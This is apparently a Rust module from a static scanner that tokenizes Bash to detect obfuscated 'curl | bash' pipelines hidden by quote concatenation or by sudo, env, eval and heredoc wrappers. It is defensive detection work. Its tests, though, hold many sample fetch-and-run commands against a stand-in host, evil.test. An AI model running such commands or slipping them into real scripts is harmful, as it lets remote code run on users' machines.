//! Small, non-executing shell lexical helpers used by static analysis.
//!
//! This is intentionally not a shell evaluator. It only models enough Bash
//! tokenization to distinguish comments and quoted command-word fragments from
//! quoted data. In particular, adjacent fragments such as `cu""rl` are one
//! executable word, while the pipe in `echo "curl | bash"` remains data.

#[derive(Debug, Clone, PartialEq, Eq)]
struct ShellWord {
    value: String,
    obfuscated: bool,
    line: usize,
}

#[derive(Debug, Clone, PartialEq, Eq)]
enum Token {
    Word(ShellWord),
    Pipe,
    Separator,
    Redirection(Redirection),
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
struct Redirection {
    fd: u8,
    kind: RedirectionKind,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum RedirectionKind {
    Input,
    Output,
    HereString,
    Heredoc,
    BothOutput,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct DownloadExecute {
    pub downloader: String,
    pub executor: String,
    pub line: usize,
}

fn finish_word(
    tokens: &mut Vec<Token>,
    word: &mut String,
    obfuscated: &mut bool,
    word_line: usize,
) {
    if !word.is_empty() || *obfuscated {
        tokens.push(Token::Word(ShellWord {
            value: std::mem::take(word),
            obfuscated: std::mem::take(obfuscated),
            line: word_line,
        }));
    }
}

fn push_separator(tokens: &mut Vec<Token>) {
    if !matches!(tokens.last(), None | Some(Token::Separator)) {
        tokens.push(Token::Separator);
    }
}

fn redirection_fd(
    tokens: &mut Vec<Token>,
    word: &mut String,
    obfuscated: &mut bool,
    word_line: usize,
    default: u8,
) -> u8 {
    if !*obfuscated && !word.is_empty() && word.chars().all(|ch| ch.is_ascii_digit()) {
        let fd = word.parse().unwrap_or(default);
        word.clear();
        fd
    } else {
        finish_word(tokens, word, obfuscated, word_line);
        default
    }
}

/// Tokenize shell control operators and words without expanding anything.
fn tokenize(content: &str) -> Vec<Token> {
    let chars: Vec<char> = content.chars().collect();
    let mut tokens = Vec::new();
    let mut word = String::new();
    let mut obfuscated = false;
    let mut quote = None;
    let mut line = 1usize;
    let mut word_line = 1usize;
    let mut i = 0usize;

    while i < chars.len() {
        let ch = chars[i];

        if let Some(delimiter) = quote {
            if ch == delimiter {
                quote = None;
                obfuscated = true;
            } else if ch == '\\' && delimiter == '"' && i + 1 < chars.len() {
                let next = chars[i + 1];
                if next == '\n' {
                    line += 1;
                } else {
                    word.push(next);
                    obfuscated = true;
                }
                i += 1;
            } else {
                if ch == '\n' {
                    line += 1;
                }
                word.push(ch);
            }
            i += 1;
            continue;
        }

        match ch {
            '\'' | '"' => {
                if word.is_empty() {
                    word_line = line;
                }
                quote = Some(ch);
                obfuscated = true;
            }
            '\\' if i + 1 < chars.len() => {
                let next = chars[i + 1];
                if next == '\n' {
                    line += 1;
                } else {
                    if word.is_empty() {
                        word_line = line;
                    }
                    word.push(next);
                    obfuscated = true;
                }
                i += 1;
            }
            '#' if word.is_empty() => {
                while i + 1 < chars.len() && chars[i + 1] != '\n' {
                    i += 1;
                }
            }
            '&' if i + 1 < chars.len() && chars[i + 1] == '>' => {
                finish_word(&mut tokens, &mut word, &mut obfuscated, word_line);
                tokens.push(Token::Redirection(Redirection {
                    fd: 1,
                    kind: RedirectionKind::BothOutput,
                }));
                i += 1;
                if i + 1 < chars.len() && chars[i + 1] == '>' {
                    i += 1;
                }
            }
            '<' | '>' => {
                let output = ch == '>';
                let fd = redirection_fd(
                    &mut tokens,
                    &mut word,
                    &mut obfuscated,
                    word_line,
                    u8::from(output),
                );
                let kind =
                    if !output && i + 2 < chars.len() && chars[i + 1] == '<' && chars[i + 2] == '<'
                    {
                        i += 2;
                        RedirectionKind::HereString
                    } else if !output && i + 1 < chars.len() && chars[i + 1] == '<' {
                        i += 1;
                        if i + 1 < chars.len() && chars[i + 1] == '-' {
                            i += 1;
                        }
                        RedirectionKind::Heredoc
                    } else {
                        if i + 1 < chars.len() && matches!(chars[i + 1], '<' | '>' | '&' | '|') {
                            i += 1;
                        }
                        if output {
                            RedirectionKind::Output
                        } else {
                            RedirectionKind::Input
                        }
                    };
                tokens.push(Token::Redirection(Redirection { fd, kind }));
            }
            '|' => {
                finish_word(&mut tokens, &mut word, &mut obfuscated, word_line);
                if i + 1 < chars.len() && chars[i + 1] == '|' {
                    push_separator(&mut tokens);
                    i += 1;
                } else {
                    tokens.push(Token::Pipe);
                    if i + 1 < chars.len() && chars[i + 1] == '&' {
                        // `|&` pipes stderr as well as stdout.
                        i += 1;
                    }
                }
            }
            '&' if i + 1 < chars.len() && chars[i + 1] == '&' => {
                finish_word(&mut tokens, &mut word, &mut obfuscated, word_line);
                push_separator(&mut tokens);
                i += 1;
            }
            '&' => {
                finish_word(&mut tokens, &mut word, &mut obfuscated, word_line);
                push_separator(&mut tokens);
            }
            ';' | '{' | '}' => {
                finish_word(&mut tokens, &mut word, &mut obfuscated, word_line);
                push_separator(&mut tokens);
            }
            '\n' => {
                finish_word(&mut tokens, &mut word, &mut obfuscated, word_line);
                line += 1;
                // A command may continue on the next line after a pipe.
                if !matches!(tokens.last(), Some(Token::Pipe)) {
                    push_separator(&mut tokens);
                }
            }
            c if c.is_whitespace() => {
                finish_word(&mut tokens, &mut word, &mut obfuscated, word_line);
            }
            _ => {
                if word.is_empty() {
                    word_line = line;
                }
                word.push(ch);
            }
        }

        i += 1;
    }

    finish_word(&mut tokens, &mut word, &mut obfuscated, word_line);
    tokens
}

fn is_assignment(word: &str) -> bool {
    let Some((name, _)) = word.split_once('=') else {
        return false;
    };
    !name.is_empty()
        && name.chars().enumerate().all(|(index, ch)| {
            ch == '_' || ch.is_ascii_alphanumeric() && (index > 0 || !ch.is_ascii_digit())
        })
}

#[derive(Debug, Clone)]
struct ParsedCommand {
    words: Vec<ShellWord>,
    stdin_overridden: bool,
    stdout_overridden: bool,
}

fn parse_command(tokens: &[Token]) -> ParsedCommand {
    let mut words = Vec::new();
    let mut skip_target = false;
    let mut stdin_overridden = false;
    let mut stdout_overridden = false;

    for token in tokens {
        match token {
            Token::Redirection(redirection) => {
                skip_target = true;
                if redirection.fd == 0
                    && matches!(
                        redirection.kind,
                        RedirectionKind::Input
                            | RedirectionKind::HereString
                            | RedirectionKind::Heredoc
                    )
                {
                    stdin_overridden = true;
                }
                if redirection.fd == 1
                    && matches!(
                        redirection.kind,
                        RedirectionKind::Output | RedirectionKind::BothOutput
                    )
                {
                    stdout_overridden = true;
                }
            }
            Token::Word(_) if skip_target => skip_target = false,
            Token::Word(word) => words.push(word.clone()),
            Token::Pipe | Token::Separator => {}
        }
    }

    ParsedCommand {
        words,
        stdin_overridden,
        stdout_overridden,
    }
}

#[derive(Debug, Clone)]
struct ResolvedCommand {
    executable: ShellWord,
    args: Vec<ShellWord>,
}

fn executable(tokens: &[Token]) -> Option<ResolvedCommand> {
    let parsed = parse_command(tokens);
    let words = expand_env_split(parsed.words)?;
    let mut i = 0;

    loop {
        while words.get(i).is_some_and(|word| is_assignment(&word.value)) {
            i += 1;
        }
        let word = words.get(i)?;
        let basename = command_name(word);
        let Some(kind) = wrapper_kind(basename) else {
            return Some(ResolvedCommand {
                executable: word.clone(),
                args: words[i + 1..].to_vec(),
            });
        };
        if matches!(kind, WrapperKind::Builtin) {
            return None;
        }
        i += 1;

        while let Some(option) = words.get(i) {
            if is_assignment(&option.value) {
                i += 1;
                continue;
            }
            if option.value == "--" {
                i += 1;
                break;
            }
            if !option.value.starts_with('-') {
                break;
            }
            match wrapper_option(kind, &option.value) {
                WrapperOption::Boolean | WrapperOption::InlineValue => i += 1,
                WrapperOption::Value if i + 1 < words.len() => i += 2,
                WrapperOption::NonExecuting | WrapperOption::Unknown | WrapperOption::Value => {
                    return None;
                }
            }
        }
    }
}

fn expand_env_split(mut words: Vec<ShellWord>) -> Option<Vec<ShellWord>> {
    let mut i = 0;
    while i < words.len() {
        if command_name(&words[i]) != "env" {
            i += 1;
            continue;
        }
        let mut option = i + 1;
        while option < words.len() {
            let (value, consumed, line) =
                if matches!(words[option].value.as_str(), "-S" | "--split-string") {
                    (words.get(option + 1)?.value.as_str(), 2, words[option].line)
                } else if let Some(value) = words[option].value.strip_prefix("--split-string=") {
                    (value, 1, words[option].line)
                } else {
                    if words[option].value == "--" || !words[option].value.starts_with('-') {
                        break;
                    }
                    option += 1;
                    continue;
                };
            let split = safe_split_string(value, line)?;
            words.splice(option..option + consumed, split);
            break;
        }
        i += 1;
    }
    Some(words)
}

fn safe_split_string(value: &str, line: usize) -> Option<Vec<ShellWord>> {
    if value.is_empty()
        || value.chars().any(|ch| {
            matches!(
                ch,
                '$' | '`' | '\\' | '\'' | '"' | ';' | '|' | '&' | '<' | '>' | '(' | ')' | '{' | '}'
            )
        })
    {
        return None;
    }
    let words: Vec<_> = value
        .split_whitespace()
        .map(|value| ShellWord {
            value: value.to_string(),
            obfuscated: false,
            line,
        })
        .collect();
    (!words.is_empty()).then_some(words)
}

#[derive(Debug, Clone, Copy)]
enum WrapperKind {
    Builtin,
    Command,
    Env,
    Exec,
    Nohup,
    Privilege,
    Time,
}

fn wrapper_kind(word: &str) -> Option<WrapperKind> {
    match word {
        "builtin" => Some(WrapperKind::Builtin),
        "command" => Some(WrapperKind::Command),
        "env" => Some(WrapperKind::Env),
        "exec" => Some(WrapperKind::Exec),
        "nohup" => Some(WrapperKind::Nohup),
        "sudo" | "doas" => Some(WrapperKind::Privilege),
        "time" => Some(WrapperKind::Time),
        _ => None,
    }
}

#[derive(Debug, Clone, Copy)]
enum WrapperOption {
    Boolean,
    Value,
    InlineValue,
    NonExecuting,
    Unknown,
}

fn wrapper_option(kind: WrapperKind, option: &str) -> WrapperOption {
    match kind {
        WrapperKind::Builtin => WrapperOption::NonExecuting,
        WrapperKind::Command => match option {
            "-p" => WrapperOption::Boolean,
            "-v" | "-V" => WrapperOption::NonExecuting,
            _ => WrapperOption::Unknown,
        },
        WrapperKind::Env => match option {
            "-i" | "--ignore-environment" | "-0" | "--null" => WrapperOption::Boolean,
            "-u" | "--unset" | "-C" | "--chdir" => WrapperOption::Value,
            option
                if ["--unset=", "--chdir="]
                    .iter()
                    .any(|p| option.starts_with(p)) =>
            {
                WrapperOption::InlineValue
            }
            _ => WrapperOption::Unknown,
        },
        WrapperKind::Exec => match option {
            "-a" => WrapperOption::Value,
            "-c" | "-l" => WrapperOption::Boolean,
            _ => WrapperOption::Unknown,
        },
        WrapperKind::Nohup => WrapperOption::Unknown,
        WrapperKind::Privilege => match option {
            "-u" | "--user" | "-g" | "--group" | "-h" | "--host" | "-p" | "--prompt" | "-C"
            | "--close-from" | "-T" | "--command-timeout" | "-R" | "--chroot" | "-D"
            | "--chdir" => WrapperOption::Value,
            "-E" | "--preserve-env" | "-H" | "--set-home" | "-n" | "--non-interactive" | "-S"
            | "--stdin" | "-i" | "--login" | "-b" | "--background" => WrapperOption::Boolean,
            "-l" | "--list" | "-v" | "--validate" | "-V" | "--version" | "-e" | "--edit" => {
                WrapperOption::NonExecuting
            }
            option
                if [
                    "--user=",
                    "--group=",
                    "--host=",
                    "--prompt=",
                    "--close-from=",
                    "--command-timeout=",
                    "--chroot=",
                    "--chdir=",
                ]
                .iter()
                .any(|prefix| option.starts_with(prefix)) =>
            {
                WrapperOption::InlineValue
            }
            _ => WrapperOption::Unknown,
        },
        WrapperKind::Time => match option {
            "-f" | "--format" | "-o" | "--output" => WrapperOption::Value,
            "-a" | "--append" | "-p" | "--portability" | "-v" | "--verbose" => {
                WrapperOption::Boolean
            }
            _ => WrapperOption::Unknown,
        },
    }
}

fn command_name(word: &ShellWord) -> &str {
    word.value.rsplit('/').next().unwrap_or(&word.value)
}

/// Find a download-to-interpreter pipeline whose executable word used shell
/// quote/escape concatenation. Ordinary literal pipelines remain owned by the
/// pattern database, avoiding duplicate signals.
pub fn find_obfuscated_download_execute(content: &str) -> Option<DownloadExecute> {
    find_obfuscated_download_execute_inner(content, 0, 0)
}

fn find_obfuscated_download_execute_inner(
    content: &str,
    depth: usize,
    line_offset: usize,
) -> Option<DownloadExecute> {
    if depth > 6 {
        return None;
    }

    let (active_content, heredoc_bodies) = extract_heredoc_bodies(content);
    let tokens = tokenize(&active_content);

    for (pipe_index, token) in tokens.iter().enumerate() {
        if !matches!(token, Token::Pipe) {
            continue;
        }

        let left_start = tokens[..pipe_index]
            .iter()
            .rposition(|token| matches!(token, Token::Separator | Token::Pipe))
            .map_or(0, |index| index + 1);
        let right_end = tokens[pipe_index + 1..]
            .iter()
            .position(|token| matches!(token, Token::Separator | Token::Pipe))
            .map_or(tokens.len(), |index| pipe_index + 1 + index);

        let Some(left) = executable(&tokens[left_start..pipe_index]) else {
            continue;
        };
        let Some(right) = executable(&tokens[pipe_index + 1..right_end]) else {
            continue;
        };

        let left_parsed = parse_command(&tokens[left_start..pipe_index]);
        let right_parsed = parse_command(&tokens[pipe_index + 1..right_end]);
        if left_parsed.stdout_overridden
            || right_parsed.stdin_overridden
            || !interpreter_consumes_stdin(&right)
        {
            continue;
        }

        let downloader = command_name(&left.executable).to_ascii_lowercase();
        let executor = command_name(&right.executable).to_ascii_lowercase();
        let is_downloader = matches!(downloader.as_str(), "curl" | "wget");
        let is_executor = matches!(
            executor.as_str(),
            "bash"
                | "sh"
                | "python"
                | "python2"
                | "python3"
                | "perl"
                | "ruby"
                | "php"
                | "lua"
                | "node"
        );

        if is_downloader
            && is_executor
            && (left.executable.obfuscated || right.executable.obfuscated)
        {
            return Some(DownloadExecute {
                downloader,
                executor,
                line: line_offset + left.executable.line.min(right.executable.line),
            });
        }
    }

    for (start, end) in command_spans(&tokens) {
        let Some(command) = executable(&tokens[start..end]) else {
            continue;
        };
        let Some(script) = literal_shell_source(&command) else {
            continue;
        };
        if let Some(mut finding) =
            find_obfuscated_download_execute_inner(&script, depth + 1, line_offset)
        {
            finding.line = line_offset + command.executable.line;
            return Some(finding);
        }
    }

    for body in heredoc_bodies {
        if let Some(finding) = find_obfuscated_download_execute_inner(
            &body.content,
            depth + 1,
            line_offset + body.start_line.saturating_sub(1),
        ) {
            return Some(finding);
        }
    }

    None
}

fn command_spans(tokens: &[Token]) -> Vec<(usize, usize)> {
    let mut spans = Vec::new();
    let mut start = 0;
    for (index, token) in tokens.iter().enumerate() {
        if matches!(token, Token::Pipe | Token::Separator) {
            if start < index {
                spans.push((start, index));
            }
            start = index + 1;
        }
    }
    if start < tokens.len() {
        spans.push((start, tokens.len()));
    }
    spans
}

fn interpreter_consumes_stdin(command: &ResolvedCommand) -> bool {
    let name = command_name(&command.executable);
    if !matches!(
        name,
        "bash" | "sh" | "python" | "python2" | "python3" | "perl" | "ruby" | "php" | "lua" | "node"
    ) {
        return false;
    }

    let mut options_ended = false;
    for argument in &command.args {
        if !options_ended && argument.value == "--" {
            options_ended = true;
            continue;
        }
        if !options_ended && argument.value.starts_with('-') {
            let flags = argument.value.trim_start_matches('-');
            if flags.contains('c') || matches!(argument.value.as_str(), "-e" | "-E" | "-r") {
                return false;
            }
            continue;
        }
        return argument.value == "-";
    }
    true
}

fn literal_shell_source(command: &ResolvedCommand) -> Option<String> {
    let name = command_name(&command.executable);
    if name == "eval" {
        return literal_words(&command.args);
    }
    if !matches!(name, "bash" | "sh" | "dash" | "ksh" | "zsh") {
        return None;
    }

    for (index, argument) in command.args.iter().enumerate() {
        if argument.value == "-c"
            || argument.value == "--command"
            || argument.value.starts_with('-')
                && argument.value.trim_start_matches('-').contains('c')
        {
            return command
                .args
                .get(index + 1)
                .and_then(|script| literal_words(std::slice::from_ref(script)));
        }
        if !argument.value.starts_with('-') {
            return None;
        }
    }
    None
}

fn literal_words(words: &[ShellWord]) -> Option<String> {
    (!words.is_empty()
        && words
            .iter()
            .all(|word| !word.value.contains(['$', '`', '\n', '\r'])))
    .then(|| {
        words
            .iter()
            .map(|word| word.value.as_str())
            .collect::<Vec<_>>()
            .join(" ")
    })
}

struct HeredocBody {
    content: String,
    start_line: usize,
}

struct HeredocSpec {
    delimiter: String,
    strip_tabs: bool,
}

struct PendingHeredoc {
    spec: HeredocSpec,
    execute: bool,
    content: String,
    start_line: usize,
}

fn extract_heredoc_bodies(content: &str) -> (String, Vec<HeredocBody>) {
    use std::collections::VecDeque;

    let mut active = String::with_capacity(content.len());
    let mut bodies = Vec::new();
    let mut pending = VecDeque::<PendingHeredoc>::new();
    let mut line_number = 1;

    for line in content.split_inclusive('\n') {
        let physical = line.strip_suffix('\n').unwrap_or(line);
        if let Some(heredoc) = pending.front_mut() {
            let candidate = if heredoc.spec.strip_tabs {
                physical.trim_start_matches('\t')
            } else {
                physical
            };
            if candidate == heredoc.spec.delimiter {
                let finished = pending.pop_front().expect("front heredoc exists");
                if finished.execute {
                    bodies.push(HeredocBody {
                        content: finished.content,
                        start_line: finished.start_line,
                    });
                }
            } else if heredoc.execute {
                heredoc.content.push_str(candidate);
                heredoc.content.push('\n');
            }
            if line.ends_with('\n') {
                active.push('\n');
            }
            line_number += 1;
            continue;
        }

        active.push_str(line);
        let specs = find_heredoc_specs(physical);
        let flags = heredoc_execution_flags(physical);
        for (index, spec) in specs.into_iter().enumerate() {
            pending.push_back(PendingHeredoc {
                spec,
                execute: flags.get(index).copied().unwrap_or(false),
                content: String::new(),
                start_line: line_number + 1,
            });
        }
        line_number += 1;
    }

    (active, bodies)
}

fn heredoc_execution_flags(header: &str) -> Vec<bool> {
    let tokens = tokenize(header);
    let mut ordinals = vec![None; tokens.len()];
    let mut count = 0;
    for (index, token) in tokens.iter().enumerate() {
        if matches!(
            token,
            Token::Redirection(Redirection {
                kind: RedirectionKind::Heredoc,
                ..
            })
        ) {
            ordinals[index] = Some(count);
            count += 1;
        }
    }
    let mut flags = vec![false; count];

    for (start, end) in command_spans(&tokens) {
        let last_input = tokens[start..end]
            .iter()
            .enumerate()
            .rev()
            .find(|(_, token)| {
                matches!(
                    token,
                    Token::Redirection(Redirection {
                        fd: 0,
                        kind: RedirectionKind::Input
                            | RedirectionKind::HereString
                            | RedirectionKind::Heredoc,
                    })
                )
            })
            .map(|(offset, _)| start + offset);
        let Some(redirection_index) = last_input else {
            continue;
        };
        let Some(ordinal) = ordinals[redirection_index] else {
            continue;
        };

        let Some(source) = executable(&tokens[start..end]) else {
            continue;
        };
        let direct_interpreter = interpreter_consumes_stdin(&source);
        let cat_to_interpreter = command_name(&source.executable) == "cat"
            && cat_reads_stdin(&source)
            && matches!(tokens.get(end), Some(Token::Pipe))
            && command_spans(&tokens)
                .into_iter()
                .find(|(next_start, _)| *next_start == end + 1)
                .is_some_and(|(next_start, next_end)| {
                    let parsed = parse_command(&tokens[next_start..next_end]);
                    !parsed.stdin_overridden
                        && executable(&tokens[next_start..next_end])
                            .is_some_and(|sink| interpreter_consumes_stdin(&sink))
                });
        flags[ordinal] = direct_interpreter || cat_to_interpreter;
    }

    flags
}

fn cat_reads_stdin(command: &ResolvedCommand) -> bool {
    command
        .args
        .iter()
        .all(|argument| argument.value.starts_with('-') || argument.value == "-")
}

fn find_heredoc_specs(line: &str) -> Vec<HeredocSpec> {
    let chars: Vec<char> = line.chars().collect();
    let mut specs = Vec::new();
    let mut quote = None;
    let mut escaped = false;
    let mut arithmetic_depth = 0usize;
    let mut i = 0;

    while i < chars.len() {
        let ch = chars[i];
        if escaped {
            escaped = false;
            i += 1;
            continue;
        }
        if let Some(delimiter) = quote {
            if ch == '\\' && delimiter == '"' {
                escaped = true;
            } else if ch == delimiter {
                quote = None;
            }
            i += 1;
            continue;
        }
        if arithmetic_depth > 0 {
            match ch {
                '(' => arithmetic_depth += 1,
                ')' => arithmetic_depth = arithmetic_depth.saturating_sub(1),
                _ => {}
            }
            i += 1;
            continue;
        }
        if ch == '$' && chars.get(i + 1) == Some(&'(') && chars.get(i + 2) == Some(&'(') {
            arithmetic_depth = 2;
            i += 3;
            continue;
        }
        if ch == '(' && chars.get(i + 1) == Some(&'(') {
            arithmetic_depth = 2;
            i += 2;
            continue;
        }
        match ch {
            '\\' => escaped = true,
            '\'' | '"' => quote = Some(ch),
            '#' if i == 0 || chars[i - 1].is_whitespace() => break,
            '<' if chars.get(i + 1) == Some(&'<') && chars.get(i + 2) != Some(&'<') => {
                i += 2;
                let strip_tabs = chars.get(i) == Some(&'-');
                if strip_tabs {
                    i += 1;
                }
                while chars.get(i).is_some_and(|ch| ch.is_whitespace()) {
                    i += 1;
                }
                let (delimiter, next) = parse_heredoc_delimiter(&chars, i);
                if !delimiter.is_empty() {
                    specs.push(HeredocSpec {
                        delimiter,
                        strip_tabs,
                    });
                }
                i = next;
                continue;
            }
            _ => {}
        }
        i += 1;
    }
    specs
}

fn parse_heredoc_delimiter(chars: &[char], mut i: usize) -> (String, usize) {
    let mut word = String::new();
    let mut quote = None;
    while i < chars.len() {
        let ch = chars[i];
        if let Some(delimiter) = quote {
            if ch == delimiter {
                quote = None;
            } else if ch == '\\' && delimiter == '"' && i + 1 < chars.len() {
                i += 1;
                word.push(chars[i]);
            } else {
                word.push(ch);
            }
            i += 1;
            continue;
        }
        match ch {
            '\'' | '"' => quote = Some(ch),
            '\\' if i + 1 < chars.len() => {
                i += 1;
                word.push(chars[i]);
            }
            ch if ch.is_whitespace() || ";&|<>".contains(ch) => break,
            _ => word.push(ch),
        }
        i += 1;
    }
    (word, i)
}

/// Remove Bash comments while preserving line numbering and quoted `#` data.
/// A `#` begins a comment only at the beginning of a shell word.
pub fn strip_comments(content: &str) -> String {
    let mut output = String::with_capacity(content.len());
    let mut quote = None;
    let mut escaped = false;
    let mut at_word_start = true;

    for line in content.split_inclusive('\n') {
        let mut comment_at = None;

        for (index, ch) in line.char_indices() {
            if escaped {
                escaped = false;
                at_word_start = false;
                continue;
            }

            if let Some(delimiter) = quote {
                if ch == delimiter {
                    quote = None;
                } else if ch == '\\' && delimiter == '"' {
                    escaped = true;
                }
                continue;
            }

            match ch {
                '\\' => {
                    escaped = true;
                    at_word_start = false;
                }
                '\'' | '"' => {
                    quote = Some(ch);
                    at_word_start = false;
                }
                '#' if at_word_start => {
                    comment_at = Some(index);
                    break;
                }
                c if c.is_whitespace() => at_word_start = true,
                ';' | '|' | '&' | '(' | ')' | '{' | '}' => at_word_start = true,
                _ => at_word_start = false,
            }
        }

        if let Some(index) = comment_at {
            output.push_str(&line[..index]);
            if line.ends_with('\n') {
                output.push('\n');
            }
            escaped = false;
            at_word_start = true;
        } else {
            output.push_str(line);
        }
    }

    output
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn reconstructs_adjacent_quoted_command_fragments() {
        let finding = find_obfuscated_download_execute(
            r#"build() { /usr/bin/cu""rl https://evil.test/p | ba''sh; }"#,
        )
        .unwrap();
        assert_eq!(finding.downloader, "curl");
        assert_eq!(finding.executor, "bash");
    }

    #[test]
    fn reconstructs_pipeline_across_newline() {
        let finding =
            find_obfuscated_download_execute("cu\"\"rl https://evil.test/p |\n  ba''sh").unwrap();
        assert_eq!(finding.line, 1);
    }

    #[test]
    fn skips_value_taking_wrapper_options() {
        for content in [
            "env -u HOME cu\"\"rl https://evil.test/p | ba''sh",
            "sudo -u nobody cu\"\"rl https://evil.test/p | ba''sh",
        ] {
            assert!(
                find_obfuscated_download_execute(content).is_some(),
                "{content}"
            );
        }
    }

    #[test]
    fn handles_executing_sudo_and_literal_env_split_options() {
        for content in [
            "sudo -i cu\"\"rl https://evil.test/p | ba''sh",
            "sudo -b cu\"\"rl https://evil.test/p | ba''sh",
            "sudo -D /tmp cu\"\"rl https://evil.test/p | ba''sh",
            "sudo --chdir /tmp cu\"\"rl https://evil.test/p | ba''sh",
            "env -S 'curl https://evil.test/p' | ba''sh",
        ] {
            assert!(
                find_obfuscated_download_execute(content).is_some(),
                "{content}"
            );
        }
    }

    #[test]
    fn rejects_nonexecuting_builtin_and_lookup_modes() {
        for content in [
            "builtin cu\"\"rl https://evil.test/p | ba''sh",
            "command -v harmless cu\"\"rl https://evil.test/p | ba''sh",
            "command -V harmless cu\"\"rl https://evil.test/p | ba''sh",
            "sudo -l cu\"\"rl https://evil.test/p | ba''sh",
        ] {
            assert!(
                find_obfuscated_download_execute(content).is_none(),
                "{content}"
            );
        }
    }

    #[test]
    fn recursively_analyzes_literal_shell_and_eval_strings() {
        for content in [
            "sh -c 'cu\"\"rl https://evil.test/p | bash'",
            "eval 'cu\"\"rl https://evil.test/p | bash'",
        ] {
            assert!(
                find_obfuscated_download_execute(content).is_some(),
                "{content}"
            );
        }
        assert!(
            find_obfuscated_download_execute("sh -c \"$runtime_script\"").is_none(),
            "dynamic strings must remain unanalyzed rather than guessed"
        );
    }

    #[test]
    fn analyzes_only_heredocs_with_an_executing_sink() {
        for content in [
            "sh <<'EOF'\ncu\"\"rl https://evil.test/p | ba''sh\nEOF",
            "cat <<'EOF' | sh\ncu\"\"rl https://evil.test/p | ba''sh\nEOF",
        ] {
            assert!(
                find_obfuscated_download_execute(content).is_some(),
                "{content}"
            );
        }
        for content in [
            "cat <<'EOF'\ncu\"\"rl https://evil.test/p | ba''sh\nEOF",
            "cat > /tmp/example <<'EOF'\ncu\"\"rl https://evil.test/p | ba''sh\nEOF",
        ] {
            assert!(
                find_obfuscated_download_execute(content).is_none(),
                "{content}"
            );
        }
    }

    #[test]
    fn honors_redirections_that_override_pipeline_endpoints() {
        for content in [
            "cu\"\"rl https://evil.test/p > /tmp/payload | ba''sh",
            "cu\"\"rl https://evil.test/p | ba''sh < /dev/null",
            "cu\"\"rl https://evil.test/p | ba''sh <<< 'echo benign'",
            "cu\"\"rl https://evil.test/p | ba''sh -c 'echo benign'",
        ] {
            assert!(
                find_obfuscated_download_execute(content).is_none(),
                "{content}"
            );
        }
        for content in [
            "cu\"\"rl https://evil.test/p 2>/dev/null | ba''sh",
            "cu\"\"rl https://evil.test/p | ba''sh > /tmp/log",
        ] {
            assert!(
                find_obfuscated_download_execute(content).is_some(),
                "{content}"
            );
        }
    }

    #[test]
    fn single_background_operator_ends_the_downloader_command() {
        assert!(
            find_obfuscated_download_execute("cu\"\"rl https://evil.test/p & printf safe | ba''sh")
                .is_none()
        );
        assert!(
            find_obfuscated_download_execute(
                "value=$((1 << 2))\ncu\"\"rl https://evil.test/p | ba''sh"
            )
            .is_some()
        );
    }

    #[test]
    fn quoted_prose_is_not_a_pipeline() {
        assert!(find_obfuscated_download_execute(r#"echo "cu\"\"rl x | ba''sh""#).is_none());
        assert!(find_obfuscated_download_execute("# cu\"\"rl x | ba''sh").is_none());
    }

    #[test]
    fn ordinary_pipeline_is_left_to_pattern_analysis() {
        assert!(find_obfuscated_download_execute("curl https://evil.test/p | bash").is_none());
    }

    #[test]
    fn pipe_stderr_operator_is_still_a_pipeline() {
        assert!(
            find_obfuscated_download_execute("cu\"\"rl https://evil.test/p |& ba''sh").is_some()
        );
    }

    #[test]
    fn noclobber_redirection_is_not_a_pipeline() {
        assert!(find_obfuscated_download_execute("cu\"\"rl >| ba''sh").is_none());
    }

    #[test]
    fn strips_only_real_shell_comments() {
        let input =
            "# base64 -d in documentation\necho '# base64 -d'\necho foo#bar\necho ok # base64 -d\n";
        let stripped = strip_comments(input);
        assert_eq!(stripped, "\necho '# base64 -d'\necho foo#bar\necho ok \n");
    }

    #[test]
    fn carries_quote_state_across_physical_lines() {
        let input =
            "echo \"documentation # still quoted\ncontinued\"; npm install js-digest # comment\n";
        assert_eq!(
            strip_comments(input),
            "echo \"documentation # still quoted\ncontinued\"; npm install js-digest \n"
        );
    }
}
